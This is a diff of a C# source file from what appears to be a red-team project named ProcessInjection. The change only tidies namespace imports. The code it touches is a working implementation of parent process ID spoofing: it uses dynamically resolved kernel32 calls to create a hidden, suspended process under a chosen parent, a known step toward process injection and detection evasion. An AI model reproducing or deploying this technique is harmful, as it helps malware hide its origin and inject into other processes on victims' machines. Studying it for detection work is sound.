@@ -1,8 +1,10 @@
-﻿using ProcessInjection.DInvoke.Native;
-using System;
+﻿using System;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
 using static ProcessInjection.Utils.Utils;
+using static ProcessInjection.Native.Structs;
+using static ProcessInjection.Native.Delegates;
+using static ProcessInjection.Native.Enum;
 
 namespace ProcessInjection.DInvoke
 {
@@ -37,11 +39,11 @@ namespace ProcessInjection.DInvoke
 
 
 
-        public Structs.PROCESS_INFORMATION DynamicParentSpoofing(int parentID, string childPath)
+        public PROCESS_INFORMATION DynamicParentSpoofing(int parentID, string childPath)
         {
-            var pInfo = new Structs.PROCESS_INFORMATION();
+            var pInfo = new PROCESS_INFORMATION();
 
-            var siEx = new DInvoke.Native.Structs.STARTUPINFOEX();
+            var siEx = new STARTUPINFOEX();
             siEx.StartupInfo.cb = (uint)Marshal.SizeOf(siEx);
             siEx.StartupInfo.dwFlags = 0x00000001;
 
@@ -56,10 +58,10 @@ namespace ProcessInjection.DInvoke
                     IntPtr.Zero
                 };
 
-                DInvoke.Native.DynamicInvoke.DynamicApiInvoke(
+                DynamicInvoke.DynamicApiInvoke(
                     "kernel32.dll",
                     "InitializeProcThreadAttributeList",
-                    typeof(DInvoke.Native.Delegates.InitializeProcThreadAttributeList),
+                    typeof(InitializeProcThreadAttributeList),
                     ref funcParams,
                     true);
 
@@ -68,10 +70,10 @@ namespace ProcessInjection.DInvoke
 
                 funcParams[0] = siEx.lpAttributeList;
 
-                DInvoke.Native.DynamicInvoke.DynamicApiInvoke(
+                DynamicInvoke.DynamicApiInvoke(
                     "kernel32.dll",
                     "InitializeProcThreadAttributeList",
-                    typeof(DInvoke.Native.Delegates.InitializeProcThreadAttributeList),
+                    typeof(InitializeProcThreadAttributeList),
                     ref funcParams,
                     true);
 
@@ -89,24 +91,24 @@ namespace ProcessInjection.DInvoke
                 {
                     siEx.lpAttributeList,
                     (uint)0,
-                    (IntPtr)DInvoke.Native.Enum.ProcThreadAttribute.PARENT_PROCESS,
+                    (IntPtr)ProcThreadAttribute.PARENT_PROCESS,
                     lpValue,
                     (IntPtr)IntPtr.Size,
                     IntPtr.Zero,
                     IntPtr.Zero
                 };
 
-                DInvoke.Native.DynamicInvoke.DynamicApiInvoke(
+                DynamicInvoke.DynamicApiInvoke(
                     "kernel32.dll",
                     "UpdateProcThreadAttribute",
-                    typeof(DInvoke.Native.Delegates.UpdateProcThreadAttribute),
+                    typeof(UpdateProcThreadAttribute),
                     ref funcParams,
                     true);
 
                 PrintInfo($"[!] Adding attributes to a list.");
 
-                var ps = new DInvoke.Native.Structs.SECURITY_ATTRIBUTES();
-                var ts = new DInvoke.Native.Structs.SECURITY_ATTRIBUTES();
+                var ps = new SECURITY_ATTRIBUTES();
+                var ts = new SECURITY_ATTRIBUTES();
                 ps.nLength = Marshal.SizeOf(ps);
                 ts.nLength = Marshal.SizeOf(ts);
 
@@ -117,21 +119,21 @@ namespace ProcessInjection.DInvoke
                     ps,
                     ts,
                     true,
-                    DInvoke.Native.Enum.CreationFlags.CREATE_SUSPENDED | DInvoke.Native.Enum.CreationFlags.EXTENDED_STARTUPINFO_PRESENT | DInvoke.Native.Enum.CreationFlags.CREATE_NO_WINDOW,
+                    CreationFlags.CREATE_SUSPENDED | CreationFlags.EXTENDED_STARTUPINFO_PRESENT | CreationFlags.CREATE_NO_WINDOW,
                     IntPtr.Zero,
                     "C:\\Windows\\System32",
                     siEx,
                     null
                 };
 
-                DInvoke.Native.DynamicInvoke.DynamicApiInvoke(
+                DynamicInvoke.DynamicApiInvoke(
                     "kernel32.dll",
                     "CreateProcessA",
-                    typeof(DInvoke.Native.Delegates.CreateProcess),
+                    typeof(CreateProcess),
                     ref funcParams,
                     true);
 
-                pInfo = (DInvoke.Native.Structs.PROCESS_INFORMATION)funcParams[9];
+                pInfo = (PROCESS_INFORMATION)funcParams[9];
                 PrintInfo($"[!] New process with ID: {pInfo.dwProcessId} created in a suspended state under the defined parent process.");
             }
 
